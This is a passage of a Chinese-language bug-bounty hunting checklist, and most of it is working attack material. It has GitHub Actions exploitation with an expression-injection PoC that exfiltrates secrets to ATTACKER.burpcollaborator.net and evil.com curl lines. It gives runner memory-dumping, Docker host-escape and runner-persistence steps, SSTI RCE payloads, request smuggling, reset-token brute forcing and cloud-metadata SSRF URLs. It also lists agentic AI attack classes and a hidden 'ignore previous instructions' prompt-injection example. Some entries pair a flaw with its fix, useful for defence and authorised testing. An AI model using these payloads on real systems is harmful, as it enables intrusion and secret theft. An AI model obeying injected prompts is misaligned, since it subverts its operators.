- [ ] ASCII 走私（LLM 输出中的不可见 unicode）

### 智能体 AI 狩猎（OWASP ASI01-ASI10）

当目标具有可访问命令行的 AI 智能体时，以下就是这 10 类攻击：

| ID | 漏洞类别 | 测试内容 |
|----|-----------|-------------|
| ASI01 | 提示注入 | 通过用户输入覆盖系统提示 —— 让智能体忽略其规则 |
| ASI02 | 工具滥用 | 让 AI 用攻击者控制的参数调用工具（通过“fetch URL”实现 SSRF，通过代码命令行实现 RCE） |
| ASI03 | 数据外带 | 通过精心构造的提示提取训练数据/PII，泄露上下文 |
| ASI04 | 权限提升 | 利用 AI 访问仅管理员可用的工具 —— 智能体权限比用户更宽 |
| ASI05 | 间接注入 | 污染 AI 处理的文档/URL —— 被抓取内容中的隐藏指令 |
| ASI06 | 过度代理 | AI 未经确认执行破坏性操作 —— 删除、发送、支付 |
| ASI07 | 模型 DoS | 构造导致无限循环、过量 token 消耗或 OOM 的输入 |
| ASI08 | 不安全输出 | AI 在其输出中生成 XSS/SQLi/命令注入并被渲染 |
| ASI09 | 供应链 | AI 调用的被攻陷插件/工具/MCP 服务器 |
| ASI10 | 敏感信息泄露 | AI 泄露内部配置、API 密钥、系统提示、用户数据 |

**分诊规则：** 单独的 ASI = Informational。必须链接到 IDOR/外带/RCE/ATO 才能获得赏金。

## 缓存投毒 / Web 缓存欺骗
- [ ] 测试 `X-Forwarded-Host`、`X-Original-URL`、`X-Rewrite-URL` —— 未纳入缓存键的 header 被反射到响应中
- [ ] 参数隐藏（`?param=value;poison=xss`）
- [ ] Fat GET（GET 请求上的 body 参数）
- [ ] Web 缓存欺骗（`/account/settings.css` —— 诱使缓存存储私有响应）
- [ ] Param Miner（Burp 扩展）—— 自动发现未纳入缓存键的 header

## HTTP 请求走私
- [ ] CL.TE：前端处理 Content-Length，后端处理 Transfer-Encoding
- [ ] TE.CL：前端处理 Transfer-Encoding，后端处理 Content-Length
- [ ] H2.CL：HTTP/2 降级走私
- [ ] TE 混淆：`Transfer-Encoding: xchunked`、tab 前缀、空格前缀
- [ ] 使用 Burp 的 “HTTP Request Smuggler” 扩展 —— 自动检测

### CL.TE 示例
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
前端读取 Content-Length: 13 -> 全部发送。后端读取 Transfer-Encoding -> 看到块 “0” = 结束 -> “SMUGGLED” 残留在缓冲区 -> 下一个用户的请求被污染。

## Android / 移动端狩猎
- [ ] 证书绑定绕过（Frida/objection）
- [ ] 导出的 activity/receiver（AndroidManifest.xml）
- [ ] Deep link 注入
- [ ] 明文的 Shared preferences / SQLite
- [ ] WebView JavaScript bridge
- [ ] 移动端 API 常常使用比 Web 更旧/不同的 API 版本

## CI/CD 流水线 —— GitHub Actions 安全

> **工具**：使用 [sisakulint](https://sisaku-security.github.io/lint/) 进行自动化 SAST —— 52 条规则，跨步骤/作业/可复用工作流的污点传播，覆盖 GitHub Security Advisories 的 81.6%（31/38 GHSAs）。安装：`brew install sisakulint` 或从 releases 下载二进制。
>
> **快速扫描**：`sisakulint scan .github/workflows/` —— 标记 Critical/High 问题并给出自动修复建议。
> **远程扫描**：`sisakulint scan --remote owner/repo` —— 无需克隆即可扫描。

### 侦察：寻找工作流文件

```bash
# Clone target's public repos, then:
find . -name "*.yml" -path "*/.github/workflows/*" | head -50

# Quick grep for dangerous patterns:
grep -rn "pull_request_target\|workflow_run" .github/workflows/
grep -rn 'github\.event\.\(issue\|pull_request\|comment\)' .github/workflows/
grep -rn 'GITHUB_ENV\|GITHUB_OUTPUT\|GITHUB_PATH' .github/workflows/
grep -rn 'secrets\.\|secrets: inherit' .github/workflows/

# Run sisakulint on all workflows:
sisakulint scan .github/workflows/
```

### 类别 1：代码注入与表达式安全（CICD-SEC-04）

**根本原因**：不可信输入（`github.event.issue.title`、`github.event.pull_request.body`、分支名、提交信息）通过 `${{ }}` 表达式被插值进 `run:` 块。

**污点源**（攻击者可控）：
```
github.event.issue.title / .body
github.event.pull_request.title / .body / .head.ref
github.event.comment.body
github.event.review.body
github.event.pages.*.page_name
github.event.commits.*.message / .author.name
github.event.head_commit.message / .author.name
github.event.workflow_run.head_branch
github.head_ref
```

- [ ] **表达式注入** —— `run:` 块中的 `${{ github.event.issue.title }}` = RCE
  ```yaml
  # VULNERABLE — attacker creates issue with title: a]]; curl https://evil.com/$(env | base64) #
  run: echo "${{ github.event.issue.title }}"

  # FIXED — use env var (shell-quoted, not expression-interpolated)
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
  ```
- [ ] **环境变量注入** —— 不可信输入 → `$GITHUB_ENV`
  ```yaml
  # VULNERABLE — attacker injects newline + arbitrary VAR=VALUE
  run: echo "BRANCH=${{ github.head_ref }}" >> $GITHUB_ENV

  # FIXED — use heredoc delimiter
  run: |
    {
      echo "BRANCH<<EOF"
      echo "${{ github.head_ref }}"
      echo "EOF"
    } >> $GITHUB_ENV
  ```
- [ ] **PATH 注入** —— 不可信输入 → `$GITHUB_PATH` = 任意二进制执行
- [ ] **输出覆盖** —— 不可信输入 → `$GITHUB_OUTPUT` 且无 heredoc 分隔符 = 下游作业被操纵
- [ ] **参数注入** —— 不可信输入作为 CLI 参数（例如 `docker run ${{ ... }}`）
  ```yaml
  # VULNERABLE
  run: docker run ${{ github.event.pull_request.body }}

  # FIXED — end-of-options marker + env var
  env:
    INPUT: ${{ github.event.pull_request.body }}
  run: docker run -- "$INPUT"
  ```
- [ ] **请求伪造（SSRF）** —— 工作流内 `curl`/`wget` 中攻击者控制的 URL

### 类别 2：流水线投毒与不可信检出

**根本原因**：特权触发器（`pull_request_target`、`workflow_run`）检出了攻击者的 PR 代码，随后该代码以仓库密钥运行。

- [ ] **不可信检出** —— 在 `pull_request_target` 上使用 `actions/checkout` 且未指定明确的安全 ref
  ```yaml
  # VULNERABLE — checks out attacker's PR code with repo secrets
  on: pull_request_target
  jobs:
    build:
      steps:
        - uses: actions/checkout@v4
          with:
            ref: ${{ github.event.pull_request.head.sha }}  # ATTACKER CODE
        - run: make build  # runs attacker's Makefile with secrets

  # FIXED — only checkout base branch, or use read-only permissions
  permissions: {}
  steps:
    - uses: actions/checkout@v4  # checks out base branch by default
  ```
- [ ] **TOCTOU（检查时与使用时的时间差）** —— 标签门控审批 + 可变 ref = 攻击者在审批后推送恶意提交
- [ ] **可复用工作流污点** —— `secrets: inherit` 把所有密钥传给处理不可信输入的被调用工作流
- [ ] **缓存投毒** —— 不可信检出 → 构建 → 缓存写入 → 可信工作流读取被投毒的缓存
- [ ] **缓存投毒（可投毒步骤）** —— 不安全的检出后紧跟构建步骤，然后保存缓存
- [ ] **产物投毒** —— 从不可信的 `workflow_run` 通过 `actions/download-artifact` 下载且未校验
  ```yaml
  # VULNERABLE — downloads artifact from untrusted workflow, then executes it
  on: workflow_run
  steps:
    - uses: actions/download-artifact@v4
    - run: ./downloaded-binary  # attacker-controlled binary

  # FIXED — verify artifact hash/signature before execution
  ```
- [ ] **Artipacked** —— `actions/checkout` 使用 `persist-credentials: true`（默认）会在上传的产物中泄露 `.git/config` 凭据
  ```yaml
  # FIXED
  - uses: actions/checkout@v4
    with:
      persist-credentials: false
  ```

### 类别 3：供应链与依赖安全（CICD-SEC-08）

- [ ] **未固定版本的 action** —— `uses: actions/checkout@v4`（可变标签）而非 SHA 固定
  ```yaml
  # VULNERABLE — tag can be force-pushed
  uses: actions/checkout@v4

  # FIXED — pinned to immutable commit SHA
  uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1
  ```
- [ ] **冒名提交** —— fork 网络允许推送 SHA 看起来属于上游仓库的提交
- [ ] **Ref 混淆** —— 利用有歧义的标签/分支名加载非预期的 action 版本
- [ ] **已知存在漏洞的 action** —— 对照 GHSA 数据库检查 action（sisakulint 会自动检测）
- [ ] **已归档的 action** —— 不再维护且存在未修补漏洞的 action
- [ ] **未固定版本的容器镜像** —— `image: ubuntu:latest` 而非 SHA256 摘要固定

### 类别 4：凭据与密钥保护

- [ ] **密钥外带** —— 工作流中 `curl https://evil.com/${{ secrets.TOKEN }}`
- [ ] **产物中的密钥** —— 上传的产物包含 `.env`、凭据或隐藏文件
  ```yaml
  # FIXED — exclude hidden files
  - uses: actions/upload-artifact@v4
    with:
      include-hidden-files: false
  ```
- [ ] **未脱敏的密钥** —— `fromJson()` 派生值绕过 GitHub 的自动脱敏
  ```yaml
  # FIXED — manually mask derived secrets
  run: |
    TOKEN=$(echo '${{ secrets.JSON_CREDS }}' | jq -r '.token')
    echo "::add-mask::$TOKEN"
  ```
- [ ] **过度的 `secrets: inherit`** —— 可复用工作流调用在只需要一个密钥时却继承了全部密钥
- [ ] **硬编码凭据** —— 工作流 YAML 中直接写入 API 密钥、密码、token

### 类别 5：触发器与访问控制（CICD-SEC-01）

- [ ] **无缓解措施的危险触发器** —— `pull_request_target` 或 `workflow_run` 且无 `permissions: {}`、无审批门禁、无 ref 限制
- [ ] **仅有部分缓解措施的危险触发器** —— 存在一些防护但可被绕过
- [ ] **基于标签的审批绕过** —— `if: contains(github.event.pull_request.labels.*.name, 'approved')` 可被伪造（攻击者能添加标签）
- [ ] **机器人条件伪造** —— `if: github.actor != 'dependabot[bot]'` 只需起个相似名字的账户即可轻松绕过
- [ ] **过度的 GITHUB_TOKEN 权限** —— 只需要 `contents: read` 时却使用 `permissions: write-all`
- [ ] **公共仓库中的自托管 runner** —— 不可信 PR 在组织基础设施上执行 = 容器逃逸 → 横向移动
- [ ] **OIDC token 窃取** —— CI runner 暴露可授予云访问权限的 OIDC token

### 类别 6：AI 智能体安全（新增 —— 2025+）

- [ ] **不受限的 AI 触发** —— `allowed_non_write_users: "*"` 允许任意用户触发 AI 智能体执行
- [ ] **过度的命令行授权** —— 在不可信触发上下文中给 AI 智能体 Bash/Write/Edit 工具 = 攻击者提示 → RCE
- [ ] **通过工作流上下文的提示注入** —— `${{ github.event.issue.body }}` 被插值进 AI 智能体的提示参数

### 狩猎工作流

```
1. Recon: find all .github/workflows/*.yml in target's public repos
2. Scan: sisakulint scan .github/workflows/ (or --remote owner/repo)
3. Triage: Critical/High findings → manual verification
4. For each finding:
   a. Can I trigger this as an external contributor? (fork PR, issue creation, comment)
   b. What secrets are accessible? (check permissions: block, secrets usage)
   c. What's the blast radius? (repo secrets → deploy keys → cloud access)
5. PoC: create a fork, submit PR/issue that triggers the vulnerable workflow
6. Prove: show secret exfiltration, code execution, or artifact tampering
```

### 表达式注入 PoC 模板

```bash
# Step 1: Create an issue with injection payload in title
gh issue create --repo TARGET/REPO --title '"; curl https://ATTACKER.burpcollaborator.net/$(cat $GITHUB_ENV | base64 -w0) #' --body "test"

# Step 2: If workflow triggers on issues and interpolates title → secrets exfiltrated
# CVSS: 9.3 Critical (RCE with repo secrets)
```

### 真实世界的 GHSA（已证实有奖金）

| GHSA | Action | 漏洞类别 | 严重性 |
|---|---|---|---|
| GHSA-gq52-6phf-x2r6 | tj-actions/branch-names | 通过分支名的表达式注入 | Critical |
| GHSA-4xqx-pqpj-9fqw | atlassian/gajira-create | 特权触发器中的代码注入 | Critical |
| GHSA-g86g-chm8-7r2p | check-spelling/check-spelling | 构建日志中的密钥暴露 | Critical |
| GHSA-cxww-7g56-2vh6 | actions/download-artifact | 产物投毒（官方 action） | High |
| GHSA-h3qr-39j9-4r5v | gradle/gradle-build-action | 通过不可信检出的缓存投毒 | High |
| GHSA-mrrh-fwg8-r2c3 | tj-actions/changed-files | 供应链 —— 冒名提交 | High |
| GHSA-phf6-hm3h-x8qp | broadinstitute/cromwell | 通过代码注入的 token 暴露 | Critical |
| GHSA-qmg3-hpqr-gqvc | reviewdog/action-setup | 通过标签固定实现的时间炸弹 | High |
| GHSA-vqf5-2xx6-9wfm | github/codeql-action | 已知存在漏洞的官方 action | High |
| GHSA-hw6r-g8gj-2987 | pytorch/pytorch | 构建工作流中的参数注入 | Moderate |

### A→B 信号：CI/CD 链

```
Expression injection → secret exfiltration → cloud account takeover
Untrusted checkout → Makefile RCE → deploy key theft → repo takeover
Artifact poisoning → release binary tampering → supply chain compromise
Cache poisoning → build output manipulation → backdoored deployment
Impostor commit → pinned action hijack → all downstream repos affected
OIDC token theft → cloud metadata → S3/GCS read → customer data
Self-hosted runner → container escape → internal network pivot
```

### 深入：从 sisakulint 发现到赏金报告

sisakulint 的发现是**可能可利用**的 —— 不是已确认的漏洞。每个发现都需要人工验证。下面的模式提取自 36 份真实的付费报告（总奖金 25 万美元以上）。每一节都遵循真正带来赏金支付时的思考方式。

#### 1. 代码注入 / 参数注入

**门禁问题：** 外部攻击者能否触发该工作流，并且污点输入是否到达 shell 上下文？

**验证深度：**
1. **触发器可达性** —— `issues: opened` 和 `issue_comment: created` 可被任意 GitHub 用户触发。`pull_request_target` 可通过 fork PR 触发。检查是否存在按 actor/association 过滤的 `if:` 条件。
2. **直接污点 vs 传递污点** —— 工作流文件本身可能看起来安全。Cycode 发现 Bazel 的 1.3 万美元漏洞，是因为 `cherry-picker.yml` 通过 `with:` 把 `${{ github.event.issue.title }}` 传给了**另一个仓库中的复合 action**（`bazelbuild/continuous-integration`）。该复合 action 的 `action.yml` 中有 `run: TITLE="${{ inputs.issue-title }}"`。传统扫描器（actionlint）漏掉了这一点，因为它们不会沿 `uses:` 进入外部复合 action。**始终抓取并阅读复合 action 的 action.yml。**
3. **Payload 构造** —— 分支名不能包含空格。Ultralytics YOLO 的攻击者使用 `${IFS}`（内部字段分隔符）和 Bash 花括号展开 `{curl,-sSfL,URL}` 绕过这一限制。Issue 标题/正文没有这种限制。
4. **密钥可达性** —— 检查工作流级和作业级的 `permissions:`。没有显式 `permissions:` 块 = 仓库默认值（通常是 `write-all`）。检查 `env:` 块中的 `${{ secrets.* }}`。检查 `GITHUB_TOKEN` 是否具有写权限。
5. **影响链** —— Bazel：issue 标题注入 → 复合 action shell 注入 → `BAZEL_IO_TOKEN` + `GITHUB_TOKEN (write-all)` → 具备在 Bazel 代码库植入后门的能力（影响 Google、Kubernetes、Uber、LinkedIn）。

**扼杀信号（误报）：** `${{ contains(...) }}` 或 `${{ startsWith(...) }}` 返回布尔值，不可注入 —— 误报。`contains()` 内的 `${{ github.event.pull_request.labels.*.name }}` 求值为 `true`/`false`，而非标签文本。

#### 2. 不可信检出（Pwn Request）

**门禁问题：** 工作流是否检出了攻击者控制的代码，然后执行该检出中的某些内容？

**验证深度：**
1. **显式 vs 隐式代码执行** —— Flank 的 7500 美元漏洞：`gh pr checkout` → `gradle/gradle-build-action` 运行 Gradle → Gradle 自动把 `settings.gradle.kts` 作为 Kotlin 脚本求值。攻击者从未编写 `run:` 命令。**任何从仓库读取配置的构建命令都是执行向量**：`Makefile`、`package.json`（postinstall 脚本）、`setup.py`、`build.gradle.kts`、`.cargo/config.toml`、`Gemfile`。
2. **issue_comment 和 pull_request_target 一样危险** —— Rspack NPM token 窃取：`issue_comment` 触发器 + `refs/pull/${{ github.event.issue.number }}/head` 检出。`issue_comment` 在基础仓库上下文中运行，拥有全部密钥。草稿 PR 也包含在内。没有贡献者状态检查。**始终检查 issue_comment 工作流中的 PR 检出模式。**
3. **自托管 runner 升级** —— 如果 `runs-on:` 包含 `self-hosted`，检查：(a) runner 是否是临时的？（配置中的 `--ephemeral`）。(b) runner 是否在 Docker 组中？（`docker run -v /:/host --privileged`）。(c) PyTorch 模式：贡献者技巧（拼写修正 PR → 合并 → 获得贡献者状态 → 在无审批情况下自动触发自托管 runner）→ RoR（Runner-on-Runner：`RUNNER_TRACKING_ID=0` + 安装攻击者的 runner agent）→ 等待特权工作流 → 从 `.git/config` 或进程内存窃取 PAT。
4. **TOCTOU** —— 标签门控的 `pull_request_target` 工作流：攻击者让标签被添加（社会工程），工作流检查标签是否存在，攻击者在检查与检出之间推送恶意提交。检出时的 `ref:` 解析到新提交。**可变 ref（触发时的 `github.event.pull_request.head.sha` 与检出时的差异）是根本原因。**
5. **后利用** —— 初始访问后，枚举所有密钥：`env | base64`、`cat /proc/self/environ`、`gcore $(pgrep Runner.Worker)` + `strings core.* | grep ghp_`。PyTorch 攻击者获得 3 个机器人 PAT → 组合它们以绕过 main 分支保护。

**扼杀信号：** `if: "!github.event.pull_request.head.repo.fork"` 会阻止外部攻击者。工作流级 `permissions: {}` 配合作业级仅 `contents: read` 可限制损害。带 `--ephemeral` 标志的临时 runner 可防止持久化。

#### 3. 产物投毒

**门禁问题：** 是否存在两阶段工作流模式 —— 阶段 1（`pull_request`，无密钥）上传产物，阶段 2（`workflow_run`，有密钥）下载并使用它们？

**验证深度：**
1. **跨工作流产物流转** —— 同一工作流内的上传/下载（构建作业 → 通过 `needs:` 到测试作业）不可投毒，因为攻击者的 PR 运行的是自己的构建。危险模式是：`pull_request` 工作流上传 → 另一个 `workflow_run` 工作流下载。`workflow_run` 在另一个工作流完成时触发，并在默认分支上下文中以全部密钥运行。
2. **下载路径很重要** —— `actions/download-artifact` 使用 `path: .` 或相对工作区的路径（`grafana-server/bin`）可能覆盖源代码、构建脚本或二进制文件。安全模式：解压到 `${{ runner.temp }}/artifacts`。
3. **来源校验** —— `workflow_run` 消费方是否检查 `github.event.workflow_run.head_repository.full_name != github.repository`？如果不检查，fork PR 的产物会被盲目消费。Rust 发布流水线正是存在这一漏洞。
4. **ArtiPACKED（persist-credentials）** —— `actions/checkout` 默认 `persist-credentials: true`。这会把 `GITHUB_TOKEN` 写入 `.git/config`。如果产物上传路径包含 `.git/`（例如 `path: .`），该 token 就可从 Actions 产物中公开下载。**检查**：是否有任何 `upload-artifact` 步骤使用 `path: .` 或包含 `.git/` 的宽泛路径？

**扼杀信号：** 上传与下载在同一工作流运行中（通过 `needs:` 连接）。`workflow_run` 消费方显式检查 fork 来源。检出时 `persist-credentials: false`。

#### 4. 缓存投毒

**门禁问题：** fork PR 能否写入缓存条目，而默认分支随后在特权上下文中恢复它？

**关键：GitHub 的缓存作用域并不能完全阻止这一点。** PR 分支可以读取默认分支的缓存。fork PR 工作流可以写入缓存条目。如果缓存键是确定性的（`hashFiles('package-lock.json')`）且攻击者未修改该文件，fork PR 就会写入同一个缓存键。

**验证深度：**
1. **键的可预测性** —— `key: ${{ runner.os }}-node-${{ hashFiles('package-lock.json') }}` 完全可预测。在键中加入 `github.sha` 或 `github.run_id` 会使其不可预测。**检查每个缓存键是否包含不可预测的组成部分。**
2. **缓存层级利用** —— `workflow_run` 和 `workflow_dispatch` 工作流在默认分支上下文中运行。如果它们使用可预测的键写入缓存，能够触发上游工作流（通过 fork PR）的攻击者就可以预先污染缓存。`run-dashboard-search-e2e.yml` 模式：`workflow_run` 触发 → 使用 `hashFiles()` 键的 `actions/cache` → 所有 PR 工作流都读取这个缓存。
3. **Payload 注入** —— Cacheract：把恶意软件注入包管理器缓存（`node_modules/.cache`、`~/.cache/pip`、`~/.gradle/caches`）。恶意软件会自我延续，因为每次恢复 → 构建 → 保存的循环都会保留 payload。**缓存 TTL 为 7 天** —— payload 会在多次工作流运行中存活。
4. **特权消费** —— 缓存在默认分支上的 `push` 或 `schedule` 工作流中被恢复。这些工作流拥有完整的 `secrets` 访问权限。被投毒的依赖在 `npm install` / `pip install` / `gradle build` 期间执行并外带密钥。
5. **Clinejection 链** —— 提示注入 → AI 智能体从攻击者提交运行 `npm install` → Cacheract 进入 npm 缓存 → 夜间发布工作流恢复缓存 → VSCE_PAT、OVSX_PAT、NPM_RELEASE_TOKEN 被窃取 → 恶意 Cline v2.3.0 发布 8 小时。

**扼杀信号：** 缓存键包含 `github.sha` 或 `github.run_id`。每个工作流使用独立的缓存键。PR 工作流中使用 `actions/cache/restore`（只读）而不是 `actions/cache`（读写）。

#### 5. 自托管 Runner

**门禁问题：** 公共仓库中是否使用了自托管 runner，且外部贡献者能够触发工作流？

**验证深度：**
1. **审批设置** —— 默认：“首次贡献者需审批”。在合并一个 PR（哪怕只是修正拼写）之后，攻击者就成为“贡献者”，后续 PR 无需审批即可自动触发。GitHub runner-images 的 2 万美元漏洞正是使用了这一技巧。
2. **Runner 持久化** —— 非临时 runner 会在作业之间保留状态。`RUNNER_TRACKING_ID=0` 会阻止 runner 在作业完成后清理攻击者进程。分离的 Docker 容器（`docker run -d --restart always`）也能在清理后存活。
3. **Runner-on-Runner（RoR）** —— 在目标的自托管 runner 上安装官方 GitHub Actions runner 二进制，并将其注册到攻击者的私有组织。只使用合法的 GitHub 二进制和到 github.com 的 HTTPS —— 与正常 runner 流量无法区分。**不需要 C2 服务器。GitHub 本身就是 C2。**
4. **横向移动** —— RoR 持久化 → 等待特权 `push`/`schedule` 工作流 → 从 `.git/config`、`$GITHUB_ENV`、`/proc/PID/environ` 或 Runner.Worker 进程内存窃取 token。PyTorch：3 个机器人 PAT → 93 个仓库 → AWS S3 写权限 → `pip install pytorch` 供应链。
5. **Docker 组升级** —— `docker run -v /:/host --privileged alpine chroot /host` → 完整的主机 root。添加 SSH 密钥、修改 sudoers、安装持久后门。

**扼杀信号：** runner 注册时使用 `--ephemeral` 标志。设置为“所有外部协作者都需审批”（而不只是首次贡献者）。runner 不在 Docker 组中。私有仓库（无外部 PR）。

#### 6. 供应链（commit-sha / impostor-commit / ref-confusion）

**门禁问题：** 工作流是否对 action 使用可变标签（`@v1`、`@v2`），而这些标签是否可能被替换？

**验证深度：**
1. **标签可变性** —— `git tag -f v1 <malicious-commit>` 会替换标签。98.4% 的仓库没有使用 SHA 固定（Legit Security 2024）。tj-actions 攻击：所有版本标签（v1、v35、v45）都被替换为 memdump.py payload → 影响 2.3 万个仓库 → 218 起已确认的密钥泄露。
2. **冒名提交** —— fork 网络与父仓库共享对象存储。攻击者向 fork 推送一个提交，然后在父仓库的 `uses:` 中引用该提交 SHA。GitHub 会解析它，因为该 SHA 存在于共享对象存储中。
3. **RepoJacking** —— 组织重命名会产生重定向。旧名称变为可用。攻击者注册旧组织名，创建同名仓库，托管恶意 action。Shopify/unity-buy-sdk 使用 `MirrorNG/unity-runner` → MirrorNG 重命名为 MirageNet → `MirrorNG` 变为可认领。**检查**：`GET /users/<action-owner>` 返回 404？可能可接管。
4. **Payload 隐蔽性** —— tj-actions memdump.py：通过 `/proc/PID/maps` + `/proc/PID/mem` 从 Runner.Worker 进程内存提取密钥，用 AES+RSA 加密，输出到工作流日志。日志是公开可见的，但已加密 —— 只有攻击者有密钥。

**扼杀信号：** 完整的 40 字符 SHA 固定（`uses: actions/checkout@b4ffde65...`）。为 `github-actions` 生态配置了 Dependabot。组织级 action 允许列表。

#### 7. AI 智能体安全

**门禁问题：** 是否在工作流中调用了 AI 智能体（Gemini CLI、Claude Code、Cline、Codex），且外部用户能够影响提示？

**验证深度：**
1. **触发器 + 提示来源** —— `issues: opened` → AI 分诊机器人读取 `github.event.issue.body`。正文就是提示。HTML 注释（`<!-- ignore previous instructions -->`）在 GitHub UI 中不可见，但会包含在 API 响应中，因此也会进入 AI 提示。
2. **工具权限** —— 如果 AI 智能体拥有 Bash/Write/Edit 工具且环境中存在密钥，提示注入 = RCE + 密钥外带。`allowed_non_write_users: "*"` 意味着任意用户都能触发。
3. **多阶段链** —— Clinejection：提示注入 → AI 从攻击者提交运行 `npm install` → Cacheract 植入 npm 缓存 → 夜间发布恢复缓存 → token 被窃取 → 发布恶意版本。**单独的提示注入发现可能看起来严重性较低，但它是通往缓存投毒和供应链攻击的门户。**

**扼杀信号：** AI 处理前检查 `author_association == 'MEMBER' || 'OWNER'`。AI CLI 使用 `--read-only --no-exec` 标志。工作流级 `permissions: {}`。

#### 8. 权限 / 密钥卫生

**不是独立的漏洞** —— 这些是威力倍增器。一个 `code-injection-medium` 配合 `permissions: write-all` 就是 Critical。同样的注入配合 `permissions: { contents: read }` 则影响有限。

**链式检查清单：**
- 可复用工作流调用上的 `secrets: inherit` → 被调用工作流可访问所有组织密钥
- 缺少 `permissions:` 块 → 仓库默认值（通常是 write-all）
- `GITHUB_TOKEN` 具有 `contents: write` → CVE-2022-46258 模式：使用 Contents API 创建新的工作流文件 → 新工作流可访问所有仓库/组织密钥（原始工作流从未引用它们）

**关键参考：**
- [sisaku-security/agent-idea/bugbountyreport](https://github.com/sisaku-security/agent-idea/tree/main/bugbountyreport) —— 36 份含完整攻击链的真实报告
- [sisakulint docs/advisory](https://sisaku-security.github.io/lint/docs/advisory/) —— 38 个 GHSA 及检测映射
- [DEF CON 32: Grand Theft Actions](https://media.defcon.org/DEF%20CON%2032/) —— Khan & Stawinski，自托管 runner 漏洞累计 25 万美元以上
- [Synacktiv: GitHub Actions Exploitation (5 parts)](https://www.synacktiv.com/en/publications/github-actions-exploitation-introduction)

## SSTI —— 服务端模板注入

### 检测 Payload
```
{{7*7}}          -> 49 = Jinja2 / Twig / generic
${7*7}           -> 49 = Freemarker / Pebble / Velocity
<%= 7*7 %>       -> 49 = ERB (Ruby)
#{7*7}           -> 49 = Mako / some Ruby
*{7*7}           -> 49 = Spring (Thymeleaf)
{{7*'7'}}        -> 7777777 = Jinja2 (Twig gives 49)
```

### 测试位置
- 姓名/简介/描述字段（个人资料页面）
- 邮件模板（发票名称、确认邮件中的用户名）
- 自定义错误消息
- PDF 生成器（发票、报告导出）
- URL 路径参数
- 结果中反射的搜索查询

### Jinja2 -> RCE（Python / Flask）
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### Twig -> RCE（PHP / Symfony）
```php
{{["id"]|filter("system")}}
```

### Freemarker -> RCE（Java）
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### ERB -> RCE（Ruby on Rails）
```ruby
<%= `id` %>
```

## 子域名接管

### 检测
```bash
# Check for dangling CNAMEs
cat /tmp/subs.txt | dnsx -silent -cname -resp | grep -i "CNAME" | tee /tmp/cnames.txt
# Look for CNAMEs to: github.io, heroku.com, azurewebsites.net, netlify.app, s3.amazonaws.com

# Automated takeover detection
nuclei -l /tmp/subs.txt -t ~/nuclei-templates/takeovers/ -o /tmp/takeovers.txt
```

### 快速判定指纹
```
"There isn't a GitHub Pages site here"  -> GitHub Pages
"NoSuchBucket"                          -> AWS S3
"No such app"                           -> Heroku
"404 Web Site not found"                -> Azure App Service
"Fastly error: unknown domain"          -> Fastly CDN
"project not found"                     -> GitLab Pages
"It looks like you may have typed..."   -> Shopify
```

### 影响升级
- 基础接管：在 target.com 子域名下提供页面 -> Low/Medium
- + Cookies：如果 target.com 设置了 domain=.target.com 的 cookie -> 凭据窃取 -> High
- + OAuth 重定向：如果 sub.target.com 是已注册的 redirect_uri -> ATO 链 -> Critical
- + CSP 绕过：如果 sub.target.com 在目标的 CSP 中 -> 任意位置 XSS -> Critical

## ATO —— 账户接管（完整分类）

### 路径 1：密码重置投毒（Host 头注入）
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=victim@company.com
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### 路径 2：重置 token 在 Referrer 中泄露
点击重置链接后，如果页面加载外部资源 -> token 会通过 Referer 头泄露给外部域名。

### 路径 3：可预测 / 弱重置 token
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### 路径 4：Token 不过期 / 可重用
请求 token -> 等待 2 小时 -> 使用它 -> 仍然有效？请求 token #1 -> 请求 token #2 -> 使用 token #1 -> 仍然有效？

### 路径 5：无需重新认证即可更改邮箱
```bash
PUT /api/user/email
{"new_email": "attacker@evil.com"}
# If no current_password required -> attacker changes email -> locks out victim
```

### 路径 6：OAuth 账户绑定滥用
能否把来自不同邮箱的 OAuth 账户绑定到现有账户？

### 路径 7：会话固定
GET /login -> 记录 Set-Cookie session=XYZ -> 登录 -> 会话 ID 是否改变？如果没有改变 = 会话固定。

## 云 / 基础设施配置错误

### S3 / GCS / Azure Blob
```bash
# S3 public listing
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common names
for name in target target-backup target-assets target-prod target-staging target-uploads target-data; do
  curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done
```

### EC2 元数据（通过 SSRF）
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns role name, then:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns AccessKeyId, SecretAccessKey, Token -> Critical

# GCP (needs header Metadata-Flavor: Google):
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs header Metadata: true):
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### Firebase 开放规则
```bash
curl --max-time 30 --connect-timeout 10 -s "https://TARGET-APP.firebaseio.com/.json"
# If data returned -> open read
curl --max-time 30 --connect-timeout 10 -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'
# If success -> open write -> Critical
```

### 暴露的管理面板
```bash
/jenkins       /grafana       /kibana        /elasticsearch
/swagger-ui.html  /api-docs   /phpMyAdmin    /adminer.php
/.env          /config.json   /server-status /actuator/env
```

### Kubernetes / Docker
```bash
# K8s API (unauthenticated):
curl --max-time 30 --connect-timeout 10 -sk https://TARGET:6443/api/v1/namespaces/default/pods
# Docker API:
curl --max-time 30 --connect-timeout 10 -s http://TARGET:2375/containers/json
```

---

# 阶段 4：验证

## 7 问门禁（撰写任何报告之前运行）

全部 7 个都必须是 YES。任何一个为 NO -> 停止。

### Q1：我现在能否用真实 PoC 利用它？
写出确切的 HTTP 请求。如果你无法产出可工作的请求 -> 扼杀它。

### Q2：它是否影响没有做出任何异常行为的真实用户？
不要“用户需要……”加上 5 个前置条件。受害者什么都没做。

### Q3：影响是否具体（金钱、PII、ATO、RCE）？
